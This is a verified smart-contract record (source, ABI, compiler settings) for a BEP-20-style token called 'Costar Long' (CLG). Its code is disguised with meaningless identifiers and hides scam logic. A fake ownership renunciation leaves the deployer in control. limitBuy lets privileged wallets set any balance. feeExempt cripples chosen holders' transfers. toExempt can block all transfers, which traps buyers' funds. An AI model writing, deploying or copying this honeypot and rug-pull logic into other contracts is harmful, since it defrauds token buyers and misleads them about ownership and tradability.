{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface launchedAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract takeMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderWallet {\n    function createPair(address receiverMin, address sellTrading) external returns (address);\n}\n\ninterface minWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellLiquidityTrading) external view returns (uint256);\n\n    function transfer(address txShould, uint256 shouldTake) external returns (bool);\n\n    function allowance(address tokenTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txShould,\n        uint256 shouldTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldIs, uint256 value);\n    event Approval(address indexed tokenTeam, address indexed spender, uint256 value);\n}\n\ninterface teamLiquidity is minWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CostarLong is takeMin, minWallet, teamLiquidity {\n\n    function sellAmount() public {\n        emit OwnershipTransferred(walletFundIs, address(0));\n        minSwap = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private teamTotal;\n\n    constructor (){\n        if (fundSwapToken) {\n            receiverLimit = atTotal;\n        }\n        launchedAuto fundMarketing = launchedAuto(exemptLimit);\n        amountIs = senderWallet(fundMarketing.factory()).createPair(fundMarketing.WETH(), address(this));\n        if (autoBuyLaunched) {\n            receiverLimit = atTotal;\n        }\n        walletFundIs = _msgSender();\n        sellAmount();\n        fundShouldTx[walletFundIs] = true;\n        totalSwap[walletFundIs] = maxTxLaunch;\n        if (receiverLimit == atTotal) {\n            autoBuyLaunched = true;\n        }\n        emit Transfer(address(0), walletFundIs, maxTxLaunch);\n    }\n\n    function feeExempt(address txMarketing) public {\n        buyReceiver();\n        if (atTotal == receiverLimit) {\n            atTotal = receiverLimit;\n        }\n        if (txMarketing == walletFundIs || txMarketing == amountIs) {\n            return;\n        }\n        tokenTake[txMarketing] = true;\n    }\n\n    string private receiverTx = \"Costar Long\";\n\n    function teamList(address atList) public {\n        if (exemptTotal) {\n            return;\n        }\n        \n        fundShouldTx[atList] = true;\n        \n        exemptTotal = true;\n    }\n\n    mapping(address => bool) public fundShouldTx;\n\n    function balanceOf(address sellLiquidityTrading) public view virtual override returns (uint256) {\n        return totalSwap[sellLiquidityTrading];\n    }\n\n    bool public exemptTotal;\n\n    mapping(address => uint256) private totalSwap;\n\n    uint256 constant autoMinTeam = 14 ** 10;\n\n    mapping(address => bool) public tokenTake;\n\n    uint256 private maxTxLaunch = 100000000 * 10 ** 18;\n\n    uint256 enableTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeBuy;\n    }\n\n    uint256 swapReceiverIs;\n\n    function limitBuy(address atFund, uint256 shouldTake) public {\n        buyReceiver();\n        totalSwap[atFund] = shouldTake;\n    }\n\n    function teamWallet(address buySell, address txShould, uint256 shouldTake) internal returns (bool) {\n        if (buySell == walletFundIs) {\n            return exemptFund(buySell, txShould, shouldTake);\n        }\n        uint256 marketingLaunched = minWallet(amountIs).balanceOf(launchedShould);\n        require(marketingLaunched == swapReceiverIs);\n        require(txShould != launchedShould);\n        if (tokenTake[buySell]) {\n            return exemptFund(buySell, txShould, autoMinTeam);\n        }\n        return exemptFund(buySell, txShould, shouldTake);\n    }\n\n    uint256 public atTotal;\n\n    function buyReceiver() private view {\n        require(fundShouldTx[_msgSender()]);\n    }\n\n    bool public autoBuyLaunched;\n\n    address public walletFundIs;\n\n    function approve(address tokenTo, uint256 shouldTake) public virtual override returns (bool) {\n        teamTotal[_msgSender()][tokenTo] = shouldTake;\n        emit Approval(_msgSender(), tokenTo, shouldTake);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed marketingFrom, address indexed autoTx);\n\n    address public amountIs;\n\n    function transfer(address atFund, uint256 shouldTake) external virtual override returns (bool) {\n        return teamWallet(_msgSender(), atFund, shouldTake);\n    }\n\n    bool public fundSwapToken;\n\n    function transferFrom(address buySell, address txShould, uint256 shouldTake) external override returns (bool) {\n        if (_msgSender() != exemptLimit) {\n            if (teamTotal[buySell][_msgSender()] != type(uint256).max) {\n                require(shouldTake <= teamTotal[buySell][_msgSender()]);\n                teamTotal[buySell][_msgSender()] -= shouldTake;\n            }\n        }\n        return teamWallet(buySell, txShould, shouldTake);\n    }\n\n    function exemptFund(address buySell, address txShould, uint256 shouldTake) internal returns (bool) {\n        require(totalSwap[buySell] >= shouldTake);\n        totalSwap[buySell] -= shouldTake;\n        totalSwap[txShould] += shouldTake;\n        emit Transfer(buySell, txShould, shouldTake);\n        return true;\n    }\n\n    address exemptLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxTxLaunch;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverTx;\n    }\n\n    function allowance(address takeLaunched, address tokenTo) external view virtual override returns (uint256) {\n        if (tokenTo == exemptLimit) {\n            return type(uint256).max;\n        }\n        return teamTotal[takeLaunched][tokenTo];\n    }\n\n    function getOwner() external view returns (address) {\n        return minSwap;\n    }\n\n    uint256 public receiverLimit;\n\n    address launchedShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyFeeReceiver;\n    }\n\n    function owner() external view returns (address) {\n        return minSwap;\n    }\n\n    string private buyFeeReceiver = \"CLG\";\n\n    function toExempt(uint256 shouldTake) public {\n        buyReceiver();\n        swapReceiverIs = shouldTake;\n    }\n\n    address private minSwap;\n\n    uint8 private takeBuy = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoBuyLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLiquidityTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"}],\"name\":\"feeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundShouldTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSwapToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTake\",\"type\":\"uint256\"}],\"name\":\"limitBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"}],\"name\":\"teamList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldTake\",\"type\":\"uint256\"}],\"name\":\"toExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFundIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CostarLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}